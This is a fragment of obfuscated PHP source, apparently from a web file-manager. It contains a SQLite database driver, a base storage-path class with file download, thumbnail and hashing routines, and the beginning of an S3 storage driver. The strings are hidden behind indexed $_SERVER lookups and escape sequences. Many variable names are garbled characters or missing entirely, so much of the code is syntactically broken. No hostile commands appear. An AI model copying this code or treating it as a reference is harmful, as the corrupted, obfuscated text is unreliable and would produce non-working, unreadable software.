$this->_linkID->query($≈ö); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $‹ß = $this->getAll(); $this->numRows = count($‹ß); return $‹ß; } } public function execute($) { $ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($[35], 1); think_status($[34]); $ = $this->_linkID->exec($); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÕΩ = $this->_linkID->query($_SERVER[][37]); if (!$ÕΩ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ = $this->_linkID->query($_SERVER[][38]); if (!$) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ = array(); while ($ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $[] = $; } $this->queryID->reset(); return $; } public function getFields($) { $÷¶ =& $_SERVER[]; $ƒ≤ = $this->query($÷¶[39] . $ . $÷¶[40]); $ = array(); if ($ƒ≤) { foreach ($ƒ≤ as $–≤ => $∆ã) { $[$∆ã[$÷¶[42]]] = array($÷¶[42] => $∆ã[$÷¶[42]], $÷¶[43] => $∆ã[$÷¶[43]], $÷¶[45] => (bool) ($∆ã[$÷¶[45]] === $÷¶[22]), $÷¶[47] => $∆ã[$÷¶[66]], $÷¶[49] => (bool) $∆ã[$÷¶[67]], $÷¶[52] => (bool) $∆ã[$÷¶[67]]); } } return $; } public function getTables($ = '') { $ =& $_SERVER[]; $ƒº = $this->query($[55] . $[56] . $[57]); $∆à‹ç = array(); foreach ($ƒº as $⁄∏ => $…¢) { $∆à‹ç[$⁄∏] = current($…¢); } return $∆à‹ç; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $⁄º =& $_SERVER[]; $this->error = $this->_linkID->lastErrorMsg(); if ($⁄º[22] != $this->queryStr) { $this->error .= LNG($⁄º[58]) . $this->queryStr; } think_trace($this->error, $⁄º[22], $⁄º[59]); return $this->error; } public function escapeString($) { $ =& $_SERVER[]; if ($this->_linkID) { return $this->_linkID->escapeString($); } return str_ireplace($[68], $[69], $); } public function parseLimit($) { $÷´ =& $_SERVER[]; $ = $÷´[22]; if (!empty($)) { $ = explode($÷´[60], $); if (count($) > 1) { $ .= $÷´[61] . $[1] . $÷´[62] . $[0] . $÷´[63]; } else { $ .= $÷´[61] . $[0] . $÷´[63]; } } return $; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $‘© =& $_SERVER[]; $this->objectDriver = array($‘©[70], $‘©[71], $‘©[72], $‘©[73], $‘©[74], $‘©[75], $‘©[76], $‘©[77], $‘©[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($√ë) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($√ë, $_SERVER[][18]); } return $√ë; } public function iconvApp($Í≥ß) { return $Í≥ß; } public function iconvSystem($) { return $; } public function iconvTo($Ãó, $, $Õå) { $ =& $_SERVER[]; if (!$Ãó || !function_exists($[79])) { return $Ãó; } static $—ä‹® = array(); $…é = $ . $[80] . $Õå . $[81] . $Ãó; if (isset($—ä‹®[$…é])) { return $—ä‹®[$…é]; } if (function_exists($[82])) { $—´ = @mb_convert_encoding($Ãó, $Õå, $); } else { $—´ = @iconv($, $Õå, $Ãó); } $—´ = $—´ ? $—´ : $Ãó; if (strstr($—´, $[83])) { $—´ = str_replace($[83], $[21], $—´); } $—ä‹®[$ . $[80] . $Õå . $[81] . $Ãó] = $—´; $—ä‹®[$Õå . $[80] . $ . $[81] . $Ãó] = $Ãó; $—ä‹®[$Õå . $[80] . $ . $[81] . $—´] = $Ãó; $—ä‹®[$ . $[80] . $Õå . $[81] . $—´] = $—´; return $—´; } public function getPathInner($„î¶) { $‘á = IO::init($„î¶); return $‘á->path; } public function getPathOuter($‰¢∞) { $◊â =& $_SERVER[]; $ = strlen(trim($this->pathBase, $◊â[18])); $‰¢∞ = substr(trim($‰¢∞, $◊â[18]), $); return $this->pathDriver . $◊â[18] . ltrim($‰¢∞, $◊â[18]); } public function isParentOf($ƒñ, $’Ø) { $ =& $_SERVER[]; $ƒñ = rtrim(strtolower($ƒñ), $[18]) . $[18]; $’Ø = rtrim(strtolower($’Ø), $[18]) . $[18]; $◊Å = strpos($’Ø, $ƒñ) === 0; return $◊Å; } public function getType() { $ =& $_SERVER[]; $ = str_replace($[84], $[22], get_class($this)); return strtolower($); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($, $⁄¨) { $ﬂô÷æ =& $_SERVER[]; $ = rtrim($, $ﬂô÷æ[18]) . $ﬂô÷æ[18] . $⁄¨; $ = $this->exist($); return $ ? $ : !1; } public function setModifyTime($, $—¥≈û = '') { } public function renameObject($◊ü, $) { $—à = $; $◊ü = $this->getPathOuter($◊ü); $ = $this->pathFather($◊ü) . $; $€Ö = IO::copy($◊ü, $this->pathFather($◊ü), REPEAT_RENAME_FOLDER, $—à); if ($€Ö) { IO::remove($◊ü); } return $€Ö ? $ : !1; } public function tempFile($ = '', $ = '') { if (!$) { $ = rand_string(15); } $’Æ = TEMP_FILES . rand_string(15) . $_SERVER[][18]; @mkdir($’Æ, DEFAULT_PERRMISSIONS, !0); $ = $’Æ . $; @touch($); if ($) { file_put_contents($, $); } return $; } public function tempFileRemve($) { @unlink($); @rmdir($this->pathFather($)); } public function mkfile($—ô«ã, $«æ = '', $ = REPEAT_RENAME) { } public function mkdir($, $∆† = REPEAT_SKIP) { } public function delFile($¬∞) { } public function delFolder($) { } public function copyFile($, $¬â) { } public function moveFile($∆©ƒç, $—ï) { } public function remove($‘£) { if ($this->isFile($‘£)) { return $this->delFile($‘£); } return $this->delFolder($‘£); } public function rename($, $‡´Ñ) { } public function exist($) { } public function findByHash($·†≥ = '', $»ª = '') { return !1; } public function isFile($ƒ®) { } public function isFolder($) { } public function size($÷î) { } public function info($È¥®) { } public function infoSimple($…ë) { return $this->info($…ë); } public function infoAuth($) { return $this->info($); } public function infoFull($ﬂØ) { return $this->info($ﬂØ); } public function infoFullSimple($) { return $this->info($); } public function infoWithChildren($ÿ≤) { $–Ä =& $_SERVER[]; static $ﬂ≤√Ω = array(); if (isset($ﬂ≤√Ω[$ÿ≤])) { return $ﬂ≤√Ω[$ÿ≤]; } $»æÕú = $this->info($ÿ≤); if ($»æÕú && $»æÕú[$–Ä[43]] == $–Ä[85]) { $”ë = array($–Ä[86] => 0, $–Ä[87] => 0, $–Ä[88] => 0); $this->infoChildren($ÿ≤, $”ë); $»æÕú[$–Ä[86]] = $”ë[$–Ä[86]]; $»æÕú[$–Ä[89]] = array($–Ä[90] => $”ë[$–Ä[87]], $–Ä[91] => $”ë[$–Ä[88]]); $ﬂ≤√Ω[$ÿ≤] = $»æÕú; } return $»æÕú; } public function listPath($‘Ü, $ = false) { } public function has($, $ = false, $»≥ = false) { } public function canRead($) { } public function canWrite($œì) { } public function getContent($Ïü≥) { } public function setContent($ﬁùÍ∏∫, $ = '') { } protected function infoChildren($¬®, &$) { $Îüß◊Ü =& $_SERVER[]; check_abort_echo(); $Õº = $this->listPath($¬®, !0); $Õº = array_merge($Õº[$Îüß◊Ü[92]], $Õº[$Îüß◊Ü[93]]); foreach ($Õº as $›ä) { if ($›ä[$Îüß◊Ü[43]] == $Îüß◊Ü[85]) { $[$Îüß◊Ü[88]]++; $ = $this->getPathInner($›ä[$Îüß◊Ü[94]]); $this->infoChildren($, $); } else { $[$Îüß◊Ü[87]]++; $[$Îüß◊Ü[86]] += $›ä[$Îüß◊Ü[86]]; } } } public function fileSubstr($Û∞Ω∏, $, $) { } public function listAll($”ä) { } public function listAllMake($ ∑›ì, &$) { $ﬂí·Ω≠ =& $_SERVER[]; check_abort_echo(); $ﬂõ = $this->listPath($ ∑›ì, !0); if (!$ﬂõ) { return; } $“Ä = array_merge($ﬂõ[$ﬂí·Ω≠[92]], $ﬂõ[$ﬂí·Ω≠[93]]); foreach ($“Ä as $≈∂) { $ÿú = $≈∂[$ﬂí·Ω≠[43]] == $ﬂí·Ω≠[85]; $∆Å = array($ﬂí·Ω≠[94] => $≈∂[$ﬂí·Ω≠[94]], $ﬂí·Ω≠[85] => $ÿú); if (isset($≈∂[$ﬂí·Ω≠[86]])) { $∆Å[$ﬂí·Ω≠[86]] = $≈∂[$ﬂí·Ω≠[86]]; } if (isset($≈∂[$ﬂí·Ω≠[95]])) { $∆Å[$ﬂí·Ω≠[95]] = $≈∂[$ﬂí·Ω≠[95]]; } if (!$ÿú) { $[] = $∆Å; continue; } $[] = $∆Å; $ = $≈∂[$ﬂí·Ω≠[94]]; $ = $this->pathDriver; if (substr($≈∂[$ﬂí·Ω≠[94]], 0, strlen($)) == $) { $ = substr($, strlen($)); } $this->listAllMake($, $); } } public function listAllSimple($ÈΩâ, $ = false) { $Ãß = $this->listAll($ÈΩâ); return $this->listAllSimpleMake($Ãß, $this->getPathOuter($ÈΩâ), $); } public function listAllSimpleMake($ÊØé, $ÿÉ, $‹¶⁄û) { $ =& $_SERVER[]; $Ãë…ã = array(); $ÿÉ = rtrim(get_path_father($ÿÉ), $[18]) . $[18]; foreach ($ÊØé as $) { $ = array($[94] => $[$[94]], $[96] => $[$[94]], $[85] => $[$[85]]); if (isset($[$[86]]) && !$[$[85]]) { $[$[86]] = $[$[86]]; } if (isset($[$[95]])) { $[$[95]] = $[$[95]]; } if (is_array($[$[97]])) { $[$[96]] = $[$[97]][$[94]]; $[$[86]] = $[$[97]][$[86]]; $[$[95]] = $[$[97]][$[95]]; } else { if (substr($[$[94]], 0, strlen($ÿÉ)) == $ÿÉ) { $[$[94]] = substr($[$[94]], strlen($ÿÉ)); } } $ = $[$[85]] ? $[18] : $[22]; $[$[96]] = rtrim($[$[96]], $[18]) . $; $[$[94]] = $[18] . trim($[$[94]], $[18]) . $; if (!$‹¶⁄û) { $ÔÅø = explode($[18], trim($[$[94]], $[18])); $[$[94]] = $[18] . implode($[18], array_slice($ÔÅø, 1)) . $; } $Ãë…ã[] = $; } return array_sort_by($Ãë…ã, $[94]); } public function upload($, $, $«¢ = false, $ = REPEAT_REPLACE) { } public function uploadFileByID($„åá, $Ã†‘ø, $) { } public function uploadFileByPath($ŒÅ, $, $ = array()) { } public function isUploadServer() { $‹Ä =& $_SERVER[]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $‹Ä[98]) { return !0; } return $GLOBALS[$‹Ä[16]][$‹Ä[99]][$‹Ä[100]]; } public function isFileOutServer() { $◊Ü =& $_SERVER[]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $◊Ü[98]) { return !0; } return $GLOBALS[$◊Ü[16]][$◊Ü[99]][$◊Ü[101]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($) { $ =& $_SERVER[]; if (!$this->isCdnHost()) { return $; } return str_replace(trim(get_url_root($), $[18]), trim($this->cdnHost, $[18]), $); } public function uploadLink($⁄õ, $ = 0) { $ =& $_SERVER[]; if ($this->isUploadServer()) { return; } $≈ã = $this->getType(); if (!in_array($≈ã, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $⁄ã = 1024 * 1024 * 10; $Œ∫ = $ <= $⁄ã ? $[102] : $[103]; $ = (!$ ? 1 : ceil($ / pow(1024, 3))) * 3600 * 4; $ = $this->{$Œ∫}($⁄õ, $); if ($) { $[$[104]] = $⁄õ; $[$[105]] = $≈ã; } return $; } public function uploadFormData($, $ = 3600) { } public function multiUploadFormData($, $ ∂ = 3600) { } public function download($„åö«é, $∆ï) { } public function ext($ŸÑ) { $ =& $_SERVER[]; if (strpos($ŸÑ, $[18]) === -1) { $…Ø = $ŸÑ; } else { $…Ø = $this->pathThis($ŸÑ); } $ = $[22]; if (strstr($…Ø, $[20])) { $ = substr($…Ø, strrpos($…Ø, $[20]) + 1); $ = strtolower($); } if (strlen($) > 3 && preg_match($[106], $, $‹≤)) { $ = $[22]; } return $; } public function pathThis($) { $ =& $_SERVER[]; $ = str_replace($[107], $[18], rtrim($, $[18])); $ = strrpos($, $[18]); if ($ === !1) { return $; } return substr($, $ + 1); } public function pathFather($) { $—≤ =& $_SERVER[]; $ = str_replace($—≤[107], $—≤[18], rtrim($, $—≤[18])); $ = strrpos($, $—≤[18]); if ($ === !1) { return $—≤[22]; } return substr($, 0, $ + 1); } public function hashSimple($) { $Êè†ﬁÜ =& $_SERVER[]; if (!$) { return md5($Êè†ﬁÜ[22]); } $ﬁû = $this->size($); $ = 200; $ = 50; if ($ﬁû <= $ * $) { return $this->hashMd5($) . $ﬁû; } $ÃÑ = intval($ﬁû / $); $ÿ∑ = $Êè†ﬁÜ[22]; for ($ƒ¥ = 0; $ƒ¥ < $; $ƒ¥++) { $ÿ∑ .= $this->fileSubstr($, $ÃÑ * $ƒ¥, $); } $ÿ∑ .= $this->fileSubstr($, $ﬁû - $, $); return md5($ÿ∑) . $ﬁû; } public static $md5Cache = array(); public function hashMd5($) { if (!$) { return md5($_SERVER[][22]); } $ = $this->iconvSystem($); if (isset(self::$md5Cache[$])) { return self::$md5Cache[$]; } self::$md5Cache[$] = $this->hashMd5Shell($); if (!self::$md5Cache[$]) { self::$md5Cache[$] = @md5_file($); } return self::$md5Cache[$]; } private function hashMd5Shell($À§) { $ﬁ´ =& $_SERVER[]; if (!$À§) { return md5($ﬁ´[22]); } if (!function_exists($ﬁ´[108])) { return !1; } $ = array($ﬁ´[109], $ﬁ´[110]); $ = Cache::get($ﬁ´[111]); if (!$) { $ = BASIC_PATH . $ﬁ´[112]; $ = md5_file($); $ = $ﬁ´[113]; foreach ($ as $ﬂæÕä) { $ = shell_exec($ﬂæÕä . "\40\42{$}\42"); if ($ && substr(trim($), 0, 32) == $) { $ = $ﬂæÕä; break; } } Cache::set($ﬁ´[111], $, 3600); } if ($ == $ﬁ´[113]) { return !1; } $ = shell_exec($ . "\x20\42{$À§}\42"); $ = str_replace($ﬁ´[114], $ﬁ´[22], $); return substr($, 0, 32); } public function link($) { return $; } public function fileOut($, $ = false, $√µ = false, $ = '') { $ =& $_SERVER[]; $this->cacheMethod(null, null); if (!$ || !$this->exist($)) { show_json(LNG($[115]), !1, $√µ); } $Ã¶ = $this->getType() == $[116]; $ = $GLOBALS[$[16]][$[99]][$[117]][$[118]]; $«≤ = (double) $GLOBALS[$[16]][$[99]][$[117]][$[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $–≥ = $this->infoFull($); $Áòì = $–≥[$[86]]; $ = gmdate($[120], $–≥[$[95]]); $ = $√µ ? $√µ : $this->iconvApp($–≥[$[42]]); $◊çÎæë = 0; $ = $Áòì - 1; $ = $this->ext($); if (in_array($, array($[121], $[122], $[123], $[124]))) { $ = $[125]; } if (in_array($, array($[126]))) { $ = $[127]; } if (!$) { $ = md5($ . $Áòì); } $ = $[128] . $ . $[128]; $ﬁµ = get_file_mime($); $ = !0; $ = isset($_GET[$[129]]) ? !1 : !0; if ($ === !1 && !mime_support($ﬁµ)) { $ﬁµ = $[130]; } header($[131]); header($[132] . $ﬁµ); $ = rawurlencode($); $ = $[128] . $ . $[133] . $; if ($) { header($[134]); header($[135] . $); } else { if ($) { header($[136] . $); } } header($[137] . gmdate($[120], time() + 3600 * 24 * 30) . $[138]); header($[139]); header($[140]); header($[141]); if (isset($_SERVER[$[142]]) && strtotime($_SERVER[$[142]]) == $–≥[$[95]]) { header($[143], !0, 304); die; } if (isset($_SERVER[$[144]]) && $_SERVER[$[144]] == $) { header($[145] . $, !0, 304); die; } header($[145] . $); header($[146] . $ . $[138]); header($[147] . $); header($[148]); header($[149] . $Áòì); header($[150]); Hook::trigger($[151], $, $Áòì, $, $); if (!$ && $ == $[152]) { if ($Áòì > 1024 * 1024 * 5) { die; } $“¢ = $this->getContent($); $“¢ = Html::clearSVG($“¢); header($[153] . strlen($“¢)); echo $“¢; die; } $ = strtolower($_SERVER[$[154]]); if ($Ã¶ && $ && $) { if (strstr($, $[155])) { header($[156] . $); } else { if (strstr($, $[157])) { header($[158] . $); } else { if (strstr($, $[159])) { header($[160] . $); } } } if ($«≤) { header($[161] . $«≤); } return; } if (isset($_SERVER[$[162]])) { if (preg_match($[163], $_SERVER[$[162]], $)) { $◊çÎæë = intval($[1]); $◊çÎæë = $◊çÎæë <= 0 ? 0 : ($◊çÎæë >= $ ? $ : $◊çÎæë); if (!empty($[2])) { $ = intval($[2]); $ = $ < $◊çÎæë ? $◊çÎæë : ($ >= $ ? $ : $); } } header($[164]); header("\103\157\156\164\x65\x6e\x74\x2d\x52\x61\156\147\x65\72\x20\142\x79\164\145\163\40{$◊çÎæë}\x2d{$}\57" . $Áòì); } else { header($[165]); } header($[166]); $ƒ∏ = !0; if ($_SERVER[$[167]] == $[168] && $Áòì > 1204 * 1024 * 1024 * 2) { $ƒ∏ = !1; } if ($ƒ∏) { header($[169] . ($ - $◊çÎæë + 1)); } if ($_SERVER[$[170]] == $[171]) { return; } $…ª = 1024 * 100; $ = 0; if ($«≤) { $ = intval(1000 * 1000 * ($…ª / $«≤)); } while ($◊çÎæë <= $) { $ = timeFloat(); check_abort(); $¨¢á = $ - $◊çÎæë + 1; if ($¨¢á <= $…ª) { $…ª = $¨¢á; } echo $this->fileSubstr($, $◊çÎæë, $…ª); $◊çÎæë += $…ª; if ($…ª == $¨¢á) { $◊çÎæë = $ + 1; } if ($) { $ í = intval(1000 * 1000 * (timeFloat() - $)); $ = $ - $ í; if ($ > 5) { usleep($); } } } } public function fileOutServer($≈Ñ, $ﬂÇ–¶ = false, $ = false, $ ö–∑ = '') { $this->fileOut($≈Ñ, $ﬂÇ–¶, $, $ ö–∑); } public function fileOutLink($’¶) { header($_SERVER[][172] . $’¶); die; } public function cacheMethod($⁄û, $…¥, $ = null) { $∆ù’ü =& $_SERVER[]; static $Õ® = array(); $ = $…¥ ? ltrim($this->getPathOuter($…¥), $∆ù’ü[18]) : $∆ù’ü[22]; $Àö = $∆ù’ü[173] . $⁄û . $∆ù’ü[174] . rtrim($, $∆ù’ü[18]); if (is_null($⁄û)) { $Õ® = array(); return; } if (is_null($…¥)) { foreach ($Õ® as $Àö => $) { if (!strstr($Àö, $∆ù’ü[173] . $⁄û . $∆ù’ü[175])) { continue; } unset($Õ®[$Àö]); } return; } if (!is_null($)) { $Õ®[$Àö] = $; return; } $‹ß = isset($Õ®[$Àö]) ? $Õ®[$Àö] : null; if (!is_null($‹ß)) { return $‹ß; } $‹ß = $this->{$⁄û}($…¥); $Õ®[$Àö] = $‹ß; return $‹ß; } public function cacheMethodInfoSet($¬í, $œÆ–¶, $∆® û = false) { $Í®î =& $_SERVER[]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Í®î[176], $¬í, $œÆ–¶); $this->cacheMethod($Í®î[177], $¬í, $œÆ–¶ ? !1 : !0); if (is_array($∆® û)) { $this->cacheMethod($Í®î[178], $¬í, $∆® û); } } public function fileOutImage($, $ = 250) { $¬ë =& $_SERVER[]; set_timeout(); if (substr($, 0, 4) == $¬ë[159]) { $this->fileOutLink($); } $ = $this->info($); $„ûâ = !1; $„≤æ = isset($GLOBALS[$¬ë[179]]) ? $GLOBALS[$¬ë[179]] : array(); if ($„≤æ && $„≤æ[$¬ë[180]] == $[$¬ë[94]]) { $ = $„≤æ; $ = $[$¬ë[181]]; if ($ && isset($[$¬ë[182]])) { if ($[$¬ë[182]] <= $ && $[$¬ë[183]] <= $) { $„ûâ = !0; } } } if ($[$¬ë[86]] <= 1024 * 50 || $„ûâ || !function_exists($¬ë[184]) || $[$¬ë[185]] == $¬ë[186]) { return $this->fileOut($, !1, $[$¬ë[42]]); } $Èáø = kodIO::hashPath($); $ ß = "\143\x6f\x76\145\x72\x5f{$Èáø}\137{$}\x2e\x70\x6e\147"; $÷¥ = IO_PATH_SYSTEM_TEMP . $¬ë[187]; $Îëñ = IO::infoFullSimple($÷¥); $…™ = $Îëñ && is_array($Îëñ) ? $Îëñ[$¬ë[94]] : $¬ë[22]; if (!$…™) { $…™ = IO::mkdir($÷¥); } if ($[$¬ë[188]] == $¬ë[189] && isset($[$¬ë[190]]) && $[$¬ë[190]] == kodIO::sourceID($…™)) { $÷à = $[$¬ë[191]]; if ($ <= 500) { $Ë£¢ = preg_replace($¬ë[192], $¬ë[193], $[$¬ë[42]]); $÷à = IO::fileNameExist($…™, $Ë£¢); } return IO::fileOut(KodIO::make($÷à), !1, $[$¬ë[42]]); } $ = IO::fileNameExist($…™, $ ß); if ($) { return IO::fileOut(KodIO::make($), !1, $[$¬ë[42]]); } if ($ > 1000) { $this->makeImageCover($…™, $, $ ß, $); $this->makeImageCover($…™, $, "\143\157\166\x65\162\137{$Èáø}\x5f\62\65\x30\x2e\160\156\x67", 250); $ = IO::fileNameExist($…™, $ ß); if ($) { return IO::fileOut(KodIO::make($), !1, $[$¬ë[42]]); } die; } $ = Cache::get($ ß); if ($ == $¬ë[194] || $ == $¬ë[195]) { echo $; die; } Cache::set($ ß, $¬ë[195], 60); $ = array($…™, $[$¬ë[94]], $ ß, $); $ = $¬ë[196] . $[$¬ë[86]] . $¬ë[197] . $ ß . $¬ë[198] . $[$¬ë[42]] . $¬ë[199] . $[$¬ë[94]]; TaskQueue::add($¬ë[200], $, $, $ ß); } public function makeImageCover($, $‹Å, $√¢, $›∂◊∞) { $⁄† =& $_SERVER[]; if (IO::fileNameExist($, $√¢)) { return $⁄†[201]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $◊º = DATA_THUMB . $√¢; del_file($◊º); $ = TEMP_FILES . $√¢; if (!@file_exists($)) { $ = IO::download($‹Å, $); } if (!@file_exists($)) { return $⁄†[202]; } ImageThumb::createThumb($, $◊º, $›∂◊∞, $›∂◊∞ * 10); if (@file_exists($◊º)) { Cache::remove($√¢); return IO::move($◊º, $); } Cache::set($√¢, $⁄†[194], 600); del_file($◊º); return $⁄†[203] . $ . $⁄†[81]; } public function fileOutImageServer($≈∏, $”ä = 250) { $this->fileOutImage($≈∏, $”ä); } public function fileNameAuto($, $Ãà, $›• = REPEAT_RENAME, $ = false) { $Õª =& $_SERVER[]; $–Å = $ === $Õª[22] ? $Ãà : rtrim($, $Õª[18]) . $Õª[18] . $Ãà; if ($›• == REPEAT_REPLACE || !$this->exist($–Å) || $ && $›• != REPEAT_RENAME_FOLDER) { return $Ãà; } if ($›• == REPEAT_SKIP) { return !1; } $ÁëØ = $Õª[20] . get_path_ext($Ãà); $ÁëØ = $ÁëØ == $Õª[20] || $ ? $Õª[22] : $ÁëØ; $È†õ = 1; $ = substr($Ãà, 0, strlen($Ãà) - strlen($ÁëØ)); $÷∂ = $ . "\x28{$È†õ}\51{$ÁëØ}"; while ($this->exist(rtrim($, $Õª[18]) . $Õª[18] . $÷∂)) { $÷∂ = $ . "\x28{$È†õ}\x29{$ÁëØ}"; $È†õ++; } return $÷∂; } private function fileNameAutoList($—Çÿà, $÷ü, $ = false) { $ =& $_SERVER[]; $»¢ = $this->listPath($—Çÿà, !0); $»¢ = array_merge($»¢[$[92]], $»¢[$[93]]); $ = array_to_keyvalue($»¢, $[22], $[42]); $›™ = $[20] . get_path_ext($÷ü); $›™ = $›™ == $[20] || $ ? $[22] : $›™; $Ÿ™œ© = substr($÷ü, 0, strlen($÷ü) - strlen($›™)); $ÍÆæ = $Ÿ™œ© . "\x28\60\x29{$›™}"; for ($À≠ = 1; $À≠ <= count($) + 1; $À≠++) { $ÍÆæ = $Ÿ™œ© . "\50{$À≠}\x29{$›™}"; if (!in_array_not_case($ÍÆæ, $)) { return $ÍÆæ; } } return $ÍÆæ; } public function listAllFiles($, $‘†) { $ =& $_SERVER[]; if (empty($‘†)) { return array(); } $÷â = array_keys($‘†); $ = array(); $ = trim($, $[18]); foreach ($‘† as $ => $Õè…≥) { $—© = ltrim(substr(trim($, $[18]), strlen($)), $[18]); if (substr($, -1) == $[18]) { $—© = rtrim($—©, $[18]) . $[18]; } $ = array_merge($, $this->slicePath($—©)); } $ = array(); foreach (array_unique($) as $’±) { $–≥ = array($[94] => $this->getPathOuter($[18] . $ . $[18] . $’±), $[85] => 1, $[86] => 0); if (substr($’±, -1) != $[18]) { $–≥[$[85]] = 0; $⁄Ø = $this->getPath($ . $[18] . $’±); if (isset($‘†[$⁄Ø])) { $–ò = $‘†[$⁄Ø]; if (isset($–ò[$[86]])) { $–≥[$[86]] = intval($–ò[$[86]]); } if (isset($–ò[$[204]])) { $–≥[$[95]] = intval($–ò[$[204]]); } } } $[] = $–≥; } return $; } public function slicePath($Ãó) { $ºàâ =& $_SERVER[]; $ = explode($ºàâ[18], trim($Ãó, $ºàâ[18])); $‰Ñï = 0; do { ++$‰Ñï; $[] = implode($ºàâ[18], array_slice($, 0, $‰Ñï)) . $ºàâ[18]; } while ($‰Ñï < count($)); $[count($) - 1] = $Ãó; return $; } public function getHost() { $¬ì·†Ñ =& $_SERVER[]; $ = parse_url(trim($this->domain, $¬ì·†Ñ[18])); $…´ = isset($[$¬ì·†Ñ[205]]) ? $[$¬ì·†Ñ[205]] : http_type(); $«ô = isset($[$¬ì·†Ñ[206]]) ? $[$¬ì·†Ñ[206]] : $[$¬ì·†Ñ[94]]; if (isset($[$¬ì·†Ñ[207]])) { $«ô .= $¬ì·†Ñ[4] . $[$¬ì·†Ñ[207]]; } return $…´ . $¬ì·†Ñ[208] . $«ô; } public function pathEncode($’õ) { $ ç =& $_SERVER[]; return str_replace($ ç[209], $ ç[18], rawurlencode($’õ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ Ω) { set_timeout(); require_once SDK_DIR . $_SERVER[][210]; parent::__construct(); $this->_init($ Ω); } public function _init($) { $this->config = $; foreach ($ as $ÂÉõ => $) { if (isset($this->{$ÂÉõ})) { $this->{$ÂÉõ} = $; } } $this->endpoint = $[$_SERVER[][211]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($›ä = "\166\x34") { $this->signVer = $›ä; $this->client->setSignatureVersion($›ä); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ÎäÜ =& $_SERVER[]; $ = $this->getBucketCors(); if (!$ || !is_array($)) { return !1; } if ($[$ÎäÜ[212]] != $ÎäÜ[213] || $[$ÎäÜ[214]] != $ÎäÜ[213]) { return !1; } $ = array_map($ÎäÜ[215], $[$ÎäÜ[216]]); if (!is_array($)) { $ = array(); } $∆∏ = array($ÎäÜ[217], $ÎäÜ[218], $ÎäÜ[219], $ÎäÜ[220], $ÎäÜ[221]); $–ß÷¥ = array_diff($∆∏, $); return empty($–ß÷¥); } public function mkfile($Ï°†…ø, $◊ïﬂÆ = '', $Óñ™ = REPEAT_RENAME) { $ = $this->setContent($Ï°†…ø, $◊ïﬂÆ); if ($ !== !1) { return $this->getPathOuter($Ï°†…ø); } return !1; } public function mkdir($ ∞, $Êíµ = REPEAT_SKIP) { $ =& $_SERVER[]; if (empty($ ∞) && $ ∞ !== $[222]) { return !1; } if ($Êíµ && $this->_isFolder($ ∞)) { return $this->getPathOuter($ ∞); } $¬Ñ = $this->setContent($ ∞, $[22], !0); if ($¬Ñ !== !1) { return $this->getPathOuter($ ∞); } return !1; } public function copyFile($ÃÅ, $ÛÉøü, $ = array()) { $ﬁÆﬁö =& $_SERVER[]; $ = $this->objectMeta($ÃÅ); if (!$) { return !1; } if ($[$ﬁÆﬁö[86]] <= 1024 * 1024 * 200) { $‹´»õ = $this->client->copyObject($this->bucket, $ÃÅ, $this->bucket, $ÛÉøü, $ﬁÆﬁö[223], $); } else { $‹´»õ = $this->client->multiCopyObject($this->bucket, $ÃÅ, $this->bucket, $ÛÉøü, $); } $‹´»õ = $‹´»õ ? $this->getPathOuter($ÛÉøü) : !1; return $‹´»õ; } public function moveFile($, $≈á) { if ($this->copyFile($, $≈á)) { $this->delFile($); return $this->getPathOuter($≈á); } return !1; } public function delFile($) { return $this->client->deleteObject($this->bucket, $); } public function delFolder($) { $ =& $_SERVER[]; if (!$this->exist($)) { return !0; } $this->listItemCache = !1; $ = $this->fileList($); $this->listItemCache = !0; $ = trim($, $[18]) . $[18]; if (!empty($) && $ !== $[222] && !in_array($, $[$[92]])) { $[$[92]][] = $; } $Œß = $this->delByBatch($[$[93]]); if (!$Œß) { return !1; } $Œß = $this->delByBatch($[$[92]]); if (!$Œß) { return !1; } return $this->delFile($); } private function delByBatch($Êéï) { foreach (array_chunk($Êéï, 1000) as $) { $ = $this->client->deleteObjects($this->bucket, $); if (!$) { return !1; } } return !0; } public function rename($, $€£) { return $this->renameObject($, $€£); } public function listPath($Ë≠Ω, $Ÿì = false) { $»ø∆å =& $_SERVER[]; $«û = $this->fileList($Ë≠Ω, $»ø∆å[18], !0); foreach ($«û[$»ø∆å[92]] as $∆†⁄ï => $) { $«û[$»ø∆å[92]][$∆†⁄ï] = $this->folderInfo($, $Ÿì, $); 